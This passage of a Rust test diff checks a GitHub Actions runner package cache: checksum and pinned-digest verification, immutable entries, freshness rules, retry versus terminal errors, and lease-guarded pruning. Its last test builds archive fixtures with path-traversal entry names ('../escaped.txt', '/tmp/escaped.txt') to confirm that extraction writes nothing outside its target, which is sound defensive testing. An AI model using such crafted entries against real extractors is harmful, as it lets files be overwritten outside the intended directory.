+            .serve(tar_gz_bytes(&[("run.sh", "truncated\n")]));
+        let cache = harness.cache().with_retry_budget(3);
+
+        // First: three attempts, all bad, budget exhausted.
+        let error = cache.ensure_installed().await.unwrap_err();
+        assert!(matches!(error, PackageError::Exhausted { attempts: 3, .. }));
+        assert_eq!(
+            harness.fetcher.count(),
+            3,
+            "a mismatch is retryable, so the budget should have been spent"
+        );
+
+        // Then: the same cache, with the bytes GitHub actually published.
+        harness.fetcher.serve(good);
+        let installed = cache.ensure_installed().await.expect("clean bytes install");
+        assert_eq!(installed.version(), &version("2.330.0"));
+    }
+
+    // =====================================================================
+    // DoD 3 — an absent checksum fails closed and names the remedy; an
+    // operator-pinned digest then succeeds.
+    // =====================================================================
+
+    #[tokio::test]
+    async fn an_absent_published_checksum_refuses_to_install_and_names_the_remedy() {
+        let payload = tar_gz_bytes(&package_entries());
+        // `c3` ships this fixture precisely so this branch is reachable.
+        let without = gh::download_without_checksum("linux", "x64");
+        assert!(without.sha256_checksum().is_none());
+        let harness = Harness::new(vec![without], payload);
+        let cache = harness.cache();
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        assert!(
+            matches!(error, PackageError::ChecksumAbsent { empty: false, .. }),
+            "expected an absent checksum, got {error:?}"
+        );
+        assert!(error.is_terminal(), "failing closed is never retryable");
+        assert_eq!(
+            error.failure_reason(),
+            Some(FailureReason::RunnerPackageUnverified)
+        );
+        let action = error.operator_action().expect("a terminal error acts");
+        assert!(
+            action.contains("pin"),
+            "the remedy must name pinning, got `{action}`"
+        );
+        assert!(
+            error.to_string().contains("Pin the digest"),
+            "the message must name the remedy: `{error}`"
+        );
+        assert_eq!(
+            harness.fetcher.count(),
+            0,
+            "an unverifiable package must not be downloaded at all"
+        );
+    }
+
+    #[tokio::test]
+    async fn an_empty_published_checksum_is_reported_as_empty_rather_than_absent() {
+        // `c3` keeps absent and empty apart deliberately; both are unusable,
+        // but they are different facts about GitHub's response and the operator
+        // is owed the one that happened.
+        let payload = tar_gz_bytes(&package_entries());
+        let harness = Harness::new(
+            vec![published("linux", "x64", "2.330.0", ".tar.gz", Some(""))],
+            payload,
+        );
+
+        let error = harness.cache().ensure_installed().await.unwrap_err();
+
+        assert!(
+            matches!(error, PackageError::ChecksumAbsent { empty: true, .. }),
+            "expected an empty checksum, got {error:?}"
+        );
+        assert!(error.to_string().contains("an empty sha256_checksum"));
+    }
+
+    #[tokio::test]
+    async fn an_operator_pinned_digest_installs_what_github_published_no_checksum_for() {
+        let payload = tar_gz_bytes(&package_entries());
+        let digest = hex_digest(&payload);
+        let harness = Harness::new(
+            vec![published("linux", "x64", "2.330.0", ".tar.gz", None)],
+            payload,
+        );
+        let cache = harness.cache().with_pins(
+            PinnedDigests::new()
+                .pin("2.330.0", &digest)
+                .expect("a well-formed pin"),
+        );
+
+        let installed = cache.ensure_installed().await.expect("a pinned install");
+
+        assert_eq!(installed.version(), &version("2.330.0"));
+        assert_eq!(installed.digest().as_str(), digest);
+        assert!(installed.root().join("run.sh").is_file());
+    }
+
+    #[tokio::test]
+    async fn a_pinned_digest_is_a_digest_to_check_not_a_check_to_skip() {
+        // The failure this asserts against is the obvious misreading of
+        // "require an operator-pinned digest": treating the presence of a pin
+        // as permission to install whatever arrives.
+        let payload = tar_gz_bytes(&package_entries());
+        let harness = Harness::new(
+            vec![published("linux", "x64", "2.330.0", ".tar.gz", None)],
+            payload,
+        );
+        let cache = harness.cache().with_retry_budget(1).with_pins(
+            PinnedDigests::new()
+                .pin("2.330.0", &"a".repeat(64))
+                .unwrap(),
+        );
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        let inner = match &error {
+            PackageError::Exhausted { source, .. } => source.as_ref(),
+            other => other,
+        };
+        assert!(
+            matches!(inner, PackageError::ChecksumMismatch { .. }),
+            "a wrong pin must still refuse, got {error:?}"
+        );
+        assert!(cache.installed().unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_pin_for_a_different_version_does_not_unlock_this_one() {
+        let payload = tar_gz_bytes(&package_entries());
+        let digest = hex_digest(&payload);
+        let harness = Harness::new(
+            vec![published("linux", "x64", "2.330.0", ".tar.gz", None)],
+            payload,
+        );
+        // The operator confirmed 2.320.0, not 2.330.0.
+        let cache = harness
+            .cache()
+            .with_pins(PinnedDigests::new().pin("2.320.0", &digest).unwrap());
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        assert!(matches!(error, PackageError::ChecksumAbsent { .. }));
+        assert_eq!(harness.fetcher.count(), 0);
+    }
+
+    // =====================================================================
+    // DoD 4 — a cache entry is never mutated after extraction, and a second
+    // install of the same version is a no-op.
+    // =====================================================================
+
+    #[tokio::test]
+    async fn a_second_install_of_the_same_version_rewrites_nothing() {
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+
+        let first = cache.ensure_installed().await.expect("the first install");
+        assert_eq!(harness.fetcher.count(), 1);
+        assert_eq!(harness.catalog.calls(), 1);
+
+        // A marker the test plants inside the entry. Nothing in production
+        // writes this, so if a second install re-extracted and re-committed the
+        // directory the marker would be gone. That is a deterministic witness
+        // to a rewrite, independent of modification-time granularity.
+        let marker = first.root().join("planted-by-the-test");
+        fs::write(&marker, b"witness").expect("plant the marker");
+        let before = snapshot(first.root());
+        assert!(before.contains_key("planted-by-the-test"));
+
+        // Move past the check interval so the catalog IS consulted again. The
+        // no-op must be proved at the entry, not by the interval short-circuit
+        // that would otherwise hide it.
+        harness
+            .clock
+            .advance(Elapsed::hours(CHECK_INTERVAL_HOURS + 1));
+
+        let second = cache.ensure_installed().await.expect("the second install");
+
+        assert_eq!(second.version(), first.version());
+        assert_eq!(second.root(), first.root());
+        assert_eq!(
+            harness.catalog.calls(),
+            2,
+            "the published version should have been re-checked"
+        );
+        assert_eq!(
+            harness.fetcher.count(),
+            1,
+            "a version already held must not be downloaded again"
+        );
+        assert!(
+            marker.is_file(),
+            "the entry was replaced: the planted marker is gone"
+        );
+        assert_eq!(
+            snapshot(first.root()),
+            before,
+            "no file in a cache entry may change after it lands"
+        );
+    }
+
+    #[tokio::test]
+    async fn an_entry_is_complete_the_moment_it_exists() {
+        // The manifest lands inside the staging directory and arrives with the
+        // entry in one rename, so there is no window in which a directory
+        // exists without it. A directory with no manifest is therefore not an
+        // entry, and is not returned as one.
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+        let installed = cache.ensure_installed().await.expect("an install");
+        assert!(installed.root().join(MANIFEST_FILE).is_file());
+
+        // A directory that this module did not produce.
+        let impostor = cache.root().join("9.9.9");
+        fs::create_dir_all(impostor.join("bin")).unwrap();
+        fs::write(impostor.join("run.sh"), b"not ours").unwrap();
+
+        assert!(cache.entry(&version("9.9.9")).unwrap().is_none());
+        assert_eq!(
+            cache.installed().unwrap().len(),
+            1,
+            "only the real entry counts as installed"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_download_that_fails_leaves_no_entry_and_no_file() {
+        let (harness, _, _) = linux_fixture();
+        *harness.fetcher.fail.lock().unwrap() = true;
+        let cache = harness.cache().with_retry_budget(1);
+
+        assert!(cache.ensure_installed().await.is_err());
+
+        assert!(cache.installed().unwrap().is_empty());
+        let leftovers = all_paths(cache.root());
+        assert_eq!(
+            leftovers,
+            vec![".staging".to_string()],
+            "a failed download leaves an empty staging directory and nothing else"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_verified_package_that_will_not_extract_still_leaves_nothing_behind() {
+        // The interesting interruption: the bytes are exactly what GitHub
+        // published — the digest matches — and extraction fails anyway. The
+        // downloaded file exists at that point, so this is the path where a
+        // missing cleanup would actually leak a 150-300 MB file.
+        let payload = b"this verifies but is not a gzip stream".to_vec();
+        let harness = Harness::new(
+            vec![published(
+                "linux",
+                "x64",
+                "2.330.0",
+                ".tar.gz",
+                Some(&hex_digest(&payload)),
+            )],
+            payload,
+        );
+        let cache = harness.cache().with_retry_budget(1);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+        let inner = match &error {
+            PackageError::Exhausted { source, .. } => source.as_ref(),
+            other => other,
+        };
+        assert!(
+            matches!(inner, PackageError::Extract { .. }),
+            "expected an extraction failure, got {error:?}"
+        );
+
+        let wrote = harness.fetcher.wrote();
+        assert_eq!(wrote.len(), 1, "the download did happen");
+        assert!(
+            !wrote[0].exists(),
+            "the verified-but-unusable download at {:?} must still be removed",
+            wrote[0]
+        );
+        assert!(cache.installed().unwrap().is_empty());
+
+        // Whatever the half-extraction left is staging litter, and the sweep
+        // clears it.
+        let before = all_paths(cache.root());
+        assert!(
+            before.iter().all(|path| path.starts_with(".staging")),
+            "only staging litter may survive; found {before:?}"
+        );
+        cache.sweep_staging().expect("a sweep");
+        assert_eq!(
+            all_paths(cache.root()),
+            vec![".staging".to_string()],
+            "the sweep empties staging, leaving only the directory itself"
+        );
+    }
+
+    // =====================================================================
+    // DoD 5 — freshness, and the version rejection that must not retry.
+    // =====================================================================
+
+    #[tokio::test]
+    async fn a_cached_version_more_than_thirty_days_behind_is_refreshed_before_a_cold_start() {
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+        let first = cache.ensure_installed().await.expect("the first install");
+        assert_eq!(first.version(), &version("2.330.0"));
+
+        // A new release, and the cached entry is now past the deadline.
+        let newer = tar_gz_bytes(&[("run.sh", "#!/bin/sh\necho newer\n")]);
+        harness.catalog.publish(vec![published(
+            "linux",
+            "x64",
+            "2.340.0",
+            ".tar.gz",
+            Some(&hex_digest(&newer)),
+        )]);
+        harness.fetcher.serve(newer);
+        harness
+            .clock
+            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));
+
+        let second = cache.ensure_installed().await.expect("a refresh");
+
+        assert_eq!(second.version(), &version("2.340.0"));
+        assert_eq!(harness.fetcher.count(), 2, "the newer package was fetched");
+        assert_eq!(
+            cache.installed().unwrap().len(),
+            2,
+            "the old entry is not removed by a refresh; pruning is a separate, \
+             guarded decision"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_cached_version_inside_the_window_is_not_re_downloaded() {
+        // The other half of the rule, and the one that keeps a 150-300 MB
+        // download from following every point release.
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+        cache.ensure_installed().await.expect("the first install");
+
+        let newer = tar_gz_bytes(&[("run.sh", "newer\n")]);
+        harness.catalog.publish(vec![published(
+            "linux",
+            "x64",
+            "2.340.0",
+            ".tar.gz",
+            Some(&hex_digest(&newer)),
+        )]);
+        harness.fetcher.serve(newer);
+        harness
+            .clock
+            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS - 1));
+
+        let second = cache.ensure_installed().await.expect("the cached entry");
+
+        assert_eq!(second.version(), &version("2.330.0"));
+        assert_eq!(harness.fetcher.count(), 1, "nothing new was downloaded");
+    }
+
+    #[tokio::test]
+    async fn the_freshness_boundary_is_the_documented_thirty_days() {
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+        let installed = cache.ensure_installed().await.expect("an install");
+        let installed_at = installed.installed_at();
+
+        assert!(!cache.is_stale(&installed, installed_at));
+        assert!(!cache.is_stale(
+            &installed,
+            installed_at + Elapsed::days(FRESHNESS_WINDOW_DAYS)
+        ));
+        assert!(cache.is_stale(
+            &installed,
+            installed_at + Elapsed::days(FRESHNESS_WINDOW_DAYS) + Elapsed::seconds(1)
+        ));
+    }
+
+    #[tokio::test]
+    async fn the_published_version_is_re_checked_only_on_a_bounded_interval() {
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+        cache.ensure_installed().await.expect("the first install");
+        assert_eq!(harness.catalog.calls(), 1);
+
+        // Inside the interval: no REST call at all.
+        harness
+            .clock
+            .advance(Elapsed::hours(CHECK_INTERVAL_HOURS - 1));
+        cache.ensure_installed().await.expect("a cached answer");
+        assert_eq!(
+            harness.catalog.calls(),
+            1,
+            "a cold start inside the interval must not re-check"
+        );
+
+        // Past it: one more.
+        harness.clock.advance(Elapsed::hours(2));
+        cache.ensure_installed().await.expect("a re-check");
+        assert_eq!(harness.catalog.calls(), 2);
+    }
+
+    #[tokio::test]
+    async fn a_stale_entry_forces_a_re_check_even_inside_the_interval() {
+        // The interval saves REST budget; there is no budget worth saving once
+        // the package on disk is one GitHub may refuse.
+        let (harness, _, _) = linux_fixture();
+        let cache = harness.cache();
+        cache.ensure_installed().await.expect("an install");
+        assert_eq!(harness.catalog.calls(), 1);
+
+        harness
+            .clock
+            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));
+        // The last check is now 31 days old, so it is due anyway; wind it
+        // forward by re-checking, then step only a minute.
+        cache.ensure_installed().await.expect("a re-check");
+        let after_recheck = harness.catalog.calls();
+        harness.clock.advance(Elapsed::minutes(1));
+
+        cache.ensure_installed().await.expect("another cold start");
+
+        assert_eq!(
+            harness.catalog.calls(),
+            after_recheck + 1,
+            "a stale entry must be re-checked on every cold start, interval or not"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_version_rejection_is_terminal_and_produces_no_retry() {
+        let (harness, _, _) = linux_fixture();
+        let harness = harness.with_catalog(FakeCatalog::answering(Answer::Rejected));
+        // A budget of three, deliberately: if the rejection were treated as
+        // retryable, the counter below would read three.
+        let cache = harness.cache().with_retry_budget(3);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        assert!(
+            matches!(error, PackageError::VersionRejected { .. }),
+            "expected a version rejection, got {error:?}"
+        );
+        assert!(error.is_terminal());
+        assert_eq!(
+            error.failure_reason(),
+            Some(FailureReason::RunnerVersionRejected),
+            "the domain already names this; no second vocabulary"
+        );
+        assert!(
+            error.operator_action().is_some(),
+            "a terminal condition owes the operator an action"
+        );
+        assert!(
+            error.to_string().contains("cannot succeed"),
+            "the message must say retrying is pointless: `{error}`"
+        );
+        assert_eq!(
+            harness.catalog.calls(),
+            1,
+            "a version rejection must be attempted exactly once"
+        );
+        assert_eq!(harness.fetcher.count(), 0);
+    }
+
+    #[tokio::test]
+    async fn a_retryable_catalog_failure_does_spend_the_whole_budget() {
+        // The contrast that gives the assertion above its meaning: with the
+        // same budget and the same code path, a retryable answer is retried
+        // three times. Without this, "calls == 1" could just mean the retry
+        // loop never worked at all.
+        let (harness, _, _) = linux_fixture();
+        let harness = harness.with_catalog(FakeCatalog::answering(Answer::Unavailable));
+        let cache = harness.cache().with_retry_budget(3);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        assert!(matches!(error, PackageError::Exhausted { attempts: 3, .. }));
+        assert_eq!(
+            harness.catalog.calls(),
+            3,
+            "a retryable failure must spend the budget"
+        );
+        assert!(
+            error.operator_action().is_none(),
+            "the answer to a transient failure is to wait, not to act"
+        );
+    }
+
+    #[test]
+    fn every_terminal_condition_names_an_operator_action() {
+        // `03-control-flows.md` calls these "terminal, operator-actionable"
+        // conditions. A terminal error with nothing for the operator to do
+        // would strand them.
+        let samples = [
+            PackageError::UnsupportedHost(UnsupportedHost::UndocumentedPair {
+                os: Os::Windows,
+                arch: Arch::Arm32,
+            }),
+            PackageError::NoPackagePublished {
+                os: Os::Linux,
+                arch: Arch::Arm32,
+            },
+            PackageError::ChecksumAbsent {
+                version: version("2.330.0"),
+                os: Os::Linux,
+                arch: Arch::X64,
+                empty: false,
+            },
+            PackageError::MalformedDigest {
+                raw: "nope".to_string(),
+            },
+            PackageError::VersionRejected {
+                version: None,
+                detail: None,
+            },
+            PackageError::UnrecognisedVersion {
+                raw: "nope".to_string(),
+            },
+            PackageError::UnsupportedArchive {
+                filename: "x.rar".to_string(),
+            },
+            PackageError::UnsafeArchiveEntry {
+                entry: "../x".to_string(),
+            },
+            PackageError::VersionInUse {
+                version: version("2.330.0"),
+                attempt: fixtures::ATTEMPT_ID,
+                state: "busy",
+            },
+            PackageError::VersionHeldByUnknownAttempt {
+                version: version("2.330.0"),
+                attempt: fixtures::ATTEMPT_ID,
+            },
+            PackageError::WorkspaceInsideCache {
+                attempt: fixtures::ATTEMPT_ID,
+                path: PathBuf::from("x"),
+            },
+            PackageError::NotInstalled {
+                version: version("2.330.0"),
+            },
+        ];
+        for error in samples {
+            assert!(error.is_terminal(), "{error:?} should be terminal");
+            assert!(
+                error.operator_action().is_some(),
+                "{error:?} is terminal but tells the operator nothing"
+            );
+        }
+    }
+
+    #[test]
+    fn every_retryable_condition_withholds_an_operator_action() {
+        let samples = [
+            PackageError::ChecksumMismatch {
+                version: version("2.330.0"),
+                expected: Sha256Hex::parse(&"a".repeat(64)).unwrap(),
+                actual: Sha256Hex::parse(&"b".repeat(64)).unwrap(),
+            },
+            PackageError::CatalogUnavailable {
+                detail: "502".to_string(),
+            },
+            PackageError::Download {
+                detail: "reset".to_string(),
+            },
+            PackageError::Extract {
+                detail: "short read".to_string(),
+            },
+        ];
+        for error in samples {
+            assert!(!error.is_terminal(), "{error:?} should be retryable");
+            assert!(error.operator_action().is_none());
+        }
+    }
+
+    #[test]
+    fn exhaustion_reports_the_reason_the_budget_was_spent_on() {
+        let exhausted = PackageError::Exhausted {
+            attempts: 3,
+            source: Box::new(PackageError::ChecksumMismatch {
+                version: version("2.330.0"),
+                expected: Sha256Hex::parse(&"a".repeat(64)).unwrap(),
+                actual: Sha256Hex::parse(&"b".repeat(64)).unwrap(),
+            }),
+        };
+        assert!(exhausted.is_terminal(), "the budget is spent");
+        assert_eq!(
+            exhausted.failure_reason(),
+            Some(FailureReason::RunnerPackageUnverified),
+            "the journal reason comes from what actually failed"
+        );
+    }
+
+    // =====================================================================
+    // DoD 6 — pruning refuses a version a non-terminal attempt references,
+    // and succeeds once that attempt is terminal.
+    // =====================================================================
+
+    /// An attempt in `state`, with a runtime under the runtime directory where
+    /// `e3` will actually put it.
+    fn attempt_in(harness: &Harness, id: u128, state: AttemptState) -> RunnerAttempt {
+        let id = AttemptId::from_u128(id);
+        let runtime = harness
+            .paths
+            .runtime_dir()
+            .join(fixtures::POLICY_ID.to_string())
+            .join(id.to_string());
+        fixtures::attempt()
+            .id(id)
+            .state(state)
+            .runtime_path(runtime.to_string_lossy().to_string())
+            .build()
+    }
+
+    async fn cache_with_one_entry(harness: &Harness) -> PackageCache {
+        let cache = harness.cache();
+        cache.ensure_installed().await.expect("an install");
+        cache
+    }
+
+    #[tokio::test]
+    async fn pruning_refuses_a_version_a_non_terminal_attempt_references() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let held = version("2.330.0");
+
+        // Every non-terminal state, because "non-terminal" is `b1`'s definition
+        // and this guard must agree with it rather than with a hand-picked
+        // subset.
+        for state in AttemptState::ALL.iter().filter(|s| !s.is_terminal()) {
+            let attempt = attempt_in(&harness, 0x100, *state);
+            cache.lease(&attempt, &held).expect("a lease");
+
+            let error = cache
+                .prune(&held, std::slice::from_ref(&attempt))
+                .unwrap_err();
+
+            assert!(
+                matches!(error, PackageError::VersionInUse { .. }),
+                "state `{state}` should hold the version, got {error:?}"
+            );
+            assert!(error.is_terminal());
+            assert!(error.operator_action().is_some());
+            assert!(
+                cache.entry(&held).unwrap().is_some(),
+                "a refused prune must leave the entry in place"
+            );
+            cache.release(attempt.id).expect("release");
+        }
+    }
+
+    #[tokio::test]
+    async fn pruning_succeeds_once_the_holding_attempt_is_terminal() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let held = version("2.330.0");
+
+        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
+        cache.lease(&live, &held).expect("a lease");
+        assert_eq!(cache.holders(&held).unwrap(), vec![live.id]);
+
+        // Refused while it is running...
+        assert!(cache.prune(&held, std::slice::from_ref(&live)).is_err());
+        let root = cache
+            .entry(&held)
+            .unwrap()
+            .expect("still there")
+            .root()
+            .to_path_buf();
+        assert!(root.is_dir());
+
+        // ...and allowed the moment the same attempt is terminal.
+        for state in AttemptState::ALL.iter().filter(|s| s.is_terminal()) {
+            let concluded = attempt_in(&harness, 0x100, *state);
+            assert!(concluded.is_terminal());
+            // Re-create the entry for each terminal state so each is a real
+            // prune rather than a no-op on an already-empty cache.
+            if cache.entry(&held).unwrap().is_none() {
+                cache.ensure_installed().await.expect("re-install");
+                cache.lease(&concluded, &held).expect("a lease");
+            }
+
+            cache
+                .prune(&held, &[concluded.clone()])
+                .unwrap_or_else(|error| panic!("state `{state}` should allow a prune: {error}"));
+
+            assert!(
+                cache.entry(&held).unwrap().is_none(),
+                "state `{state}` should have pruned the entry"
+            );
+            assert!(
+                cache.holders(&held).unwrap().is_empty(),
+                "a spent lease is released with the entry"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn pruning_refuses_a_version_held_by_an_attempt_the_caller_did_not_report() {
+        // `e1` documents that a launcher's newly created attempt may not be
+        // visible to `attempts()` yet. Reading "absent" as "gone" would delete
+        // a package out from under a starting runner, so the ambiguous case
+        // fails closed.
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let held = version("2.330.0");
+        let attempt = attempt_in(&harness, 0x100, AttemptState::Starting);
+        cache.lease(&attempt, &held).expect("a lease");
+
+        let error = cache.prune(&held, &[]).unwrap_err();
+
+        assert!(
+            matches!(error, PackageError::VersionHeldByUnknownAttempt { .. }),
+            "expected a fail-closed refusal, got {error:?}"
+        );
+        assert!(cache.entry(&held).unwrap().is_some());
+        assert!(
+            error
+                .operator_action()
+                .unwrap()
+                .contains("release the lease"),
+            "the refusal must name the way out, got `{}`",
+            error.operator_action().unwrap()
+        );
+
+        // And the named remedy works.
+        cache.release(attempt.id).expect("release");
+        cache.prune(&held, &[]).expect("a released version prunes");
+        assert!(cache.entry(&held).unwrap().is_none());
+    }
+
+    #[tokio::test]
+    async fn an_unreferenced_version_prunes_with_no_ceremony() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let held = version("2.330.0");
+
+        cache.prune(&held, &[]).expect("nothing references it");
+
+        assert!(cache.entry(&held).unwrap().is_none());
+        assert!(cache.installed().unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn one_attempts_lease_does_not_pin_another_version() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+
+        // A second version, so there are two entries and one lease.
+        let newer = tar_gz_bytes(&[("run.sh", "newer\n")]);
+        harness.catalog.publish(vec![published(
+            "linux",
+            "x64",
+            "2.340.0",
+            ".tar.gz",
+            Some(&hex_digest(&newer)),
+        )]);
+        harness.fetcher.serve(newer);
+        harness
+            .clock
+            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));
+        cache.ensure_installed().await.expect("the newer install");
+        assert_eq!(cache.installed().unwrap().len(), 2);
+
+        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
+        cache.lease(&live, &version("2.340.0")).expect("a lease");
+
+        // The held one is refused, the unheld one is not.
+        assert!(cache.prune(&version("2.340.0"), &[live.clone()]).is_err());
+        cache
+            .prune(&version("2.330.0"), &[live])
+            .expect("the unheld version prunes");
+        assert_eq!(cache.installed().unwrap().len(), 1);
+    }
+
+    #[tokio::test]
+    async fn a_lease_outlives_the_cache_object_that_took_it() {
+        // The guard is only meaningful if it survives a restart, so the lease
+        // is a file rather than a field.
+        let (harness, _, _) = linux_fixture();
+        let held = version("2.330.0");
+        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
+        {
+            let cache = cache_with_one_entry(&harness).await;
+            cache.lease(&live, &held).expect("a lease");
+        }
+
+        let reopened = harness.cache();
+        assert_eq!(reopened.holders(&held).unwrap(), vec![live.id]);
+        assert!(reopened.prune(&held, &[live]).is_err());
+    }
+
+    #[tokio::test]
+    async fn releasing_a_lease_that_was_never_taken_is_not_an_error() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        cache
+            .release(AttemptId::from_u128(0xdead))
+            .expect("a cleanup path may release unconditionally");
+    }
+
+    #[tokio::test]
+    async fn leasing_a_version_that_is_not_installed_is_refused() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let attempt = attempt_in(&harness, 0x100, AttemptState::Busy);
+
+        let error = cache.lease(&attempt, &version("9.9.9")).unwrap_err();
+
+        assert!(matches!(error, PackageError::NotInstalled { .. }));
+    }
+
+    // =====================================================================
+    // DoD 7 — job workspaces are never stored inside the package cache.
+    // =====================================================================
+
+    #[tokio::test]
+    async fn a_workspace_inside_the_cache_is_refused_a_lease() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let held = version("2.330.0");
+
+        // The mistake this guard exists to catch: `e3` deriving a runtime path
+        // from the cache entry it copied from, rather than from the runtime
+        // directory.
+        for inside in [
+            cache.root().join("2.330.0").join("_work"),
+            cache.root().join("workspaces").join("attempt-1"),
+            cache.root().to_path_buf(),
+        ] {
+            let attempt = fixtures::attempt()
+                .id(AttemptId::from_u128(0x100))
+                .state(AttemptState::Busy)
+                .runtime_path(inside.to_string_lossy().to_string())
+                .build();
+
+            let error = cache.lease(&attempt, &held).unwrap_err();
+
+            assert!(
+                matches!(error, PackageError::WorkspaceInsideCache { .. }),
+                "`{}` is inside the cache and must be refused, got {error:?}",
+                inside.display()
+            );
+            assert!(
+                cache.holders(&held).unwrap().is_empty(),
+                "a refused lease must not have been written"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn a_workspace_under_the_runtime_directory_is_accepted() {
+        // The other half: without this, the refusal above could be refusing
+        // everything and the test would still be green.
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+        let held = version("2.330.0");
+        let attempt = attempt_in(&harness, 0x100, AttemptState::Busy);
+
+        cache
+            .lease(&attempt, &held)
+            .expect("a runtime under the runtime directory is where it belongs");
+
+        assert_eq!(cache.holders(&held).unwrap(), vec![attempt.id]);
+    }
+
+    #[test]
+    fn the_runtime_directory_and_the_package_cache_are_disjoint_roots() {
+        // Structural, and it holds for a layout nobody has created yet: `d1`
+        // puts workspaces under `runtime/` and the retained package cache under
+        // `state/`, so neither can contain the other.
+        let dir = tempfile::tempdir().expect("a temporary root");
+        let paths = AppPaths::rooted_at(dir.path());
+        let cache_root = paths.state_dir().join(PACKAGES_DIR);
+        let workspaces = paths.runtime_dir();
+
+        assert!(
+            !is_inside(&cache_root, workspaces),
+            "job workspaces must not live inside the package cache"
+        );
+        assert!(
+            !is_inside(workspaces, &cache_root),
+            "the package cache must not live inside the workspace root"
+        );
+        // And a concrete per-attempt workspace, the shape `e3` will build.
+        let attempt_workspace = workspaces
+            .join(fixtures::POLICY_ID.to_string())
+            .join(fixtures::ATTEMPT_ID.to_string());
+        assert!(!is_inside(&cache_root, &attempt_workspace));
+    }
+
+    #[tokio::test]
+    async fn installing_writes_nothing_under_the_runtime_directory() {
+        let (harness, _, _) = linux_fixture();
+        let cache = cache_with_one_entry(&harness).await;
+
+        assert!(
+            all_paths(harness.paths.runtime_dir()).is_empty(),
+            "the package cache must not create job workspaces: {:?}",
+            all_paths(harness.paths.runtime_dir())
+        );
+        // Everything it did write is under the cache root.
+        let written = all_paths(cache.root());
+        assert!(
+            written.iter().any(|path| path.starts_with("2.330.0")),
+            "the entry should be there: {written:?}"
+        );
+    }
+
+    #[test]
+    fn the_tool_cache_is_retained_beside_the_binaries_not_inside_an_entry() {
+        // "Runner binaries and approved tool caches are retained separately
+        // from job workspaces" — separately from workspaces, and separately
+        // from the immutable entries, because a tool cache is written to.
+        let dir = tempfile::tempdir().expect("a temporary root");
+        let paths = AppPaths::rooted_at(dir.path());
+        let cache = PackageCache::new(
+            &paths,
+            Os::Linux,
+            Arch::X64,
+            CachePorts {
+                catalog: FakeCatalog::with(Vec::new()),
+                fetcher: FakeFetcher::with(Vec::new()),
+                backoff: Arc::new(NoBackoff),
+                clock: Arc::new(FakeClock::default()),
+            },
+        );
+
+        assert!(
+            !is_inside(cache.root(), cache.tool_cache_dir()),
+            "a written-to tool cache must not sit inside the immutable entries"
+        );
+        assert!(
+            !is_inside(paths.runtime_dir(), cache.tool_cache_dir()),
+            "the tool cache is retained, not disposable with a workspace"
+        );
+        assert!(is_inside(paths.state_dir(), cache.tool_cache_dir()));
+    }
+
+    // =====================================================================
+    // Extraction
+    // =====================================================================
+
+    #[tokio::test]
+    async fn both_published_archive_formats_extract_on_every_platform() {
+        for (extension, bytes) in [
+            (".zip", zip_bytes(&package_entries())),
+            (".tar.gz", tar_gz_bytes(&package_entries())),
+        ] {
+            let digest = hex_digest(&bytes);
+            let harness = Harness::new(
+                vec![published(
+                    "linux",
+                    "x64",
+                    "2.330.0",
+                    extension,
+                    Some(&digest),
+                )],
+                bytes,
+            );
+
+            let installed = harness
+                .cache()
+                .ensure_installed()
+                .await
+                .unwrap_or_else(|error| panic!("{extension} should extract: {error}"));
+
+            assert_eq!(
+                fs::read_to_string(installed.root().join("run.sh")).unwrap(),
+                "#!/bin/sh\necho runner\n"
+            );
+            assert_eq!(
+                fs::read_to_string(installed.root().join("bin/Runner.Listener")).unwrap(),
+                "listener\n"
+            );
+        }
+    }
+
+    #[test]
+    fn an_archive_entry_that_escapes_writes_nothing_outside_the_target() {
+        let dir = tempfile::tempdir().expect("a temporary root");
+        let target = dir.path().join("target");
+        let outside = dir.path().join("escaped.txt");
+
+        for (label, bytes, kind) in [
+            (
+                "tar.gz",
+                tar_gz_with_raw_name("../escaped.txt", "owned"),
+                ArchiveKind::TarGz,
+            ),
+            (
+                "tar.gz absolute",
+                tar_gz_with_raw_name("/tmp/escaped.txt", "owned"),
+                ArchiveKind::TarGz,
+            ),
+            (
+                "zip",
+                zip_bytes(&[("../escaped.txt", "owned")]),
+                ArchiveKind::Zip,
+            ),
+        ] {
+            let archive = dir.path().join(format!("{label}.archive"));
+            fs::write(&archive, &bytes).unwrap();
+            let _ = fs::remove_dir_all(&target);
+
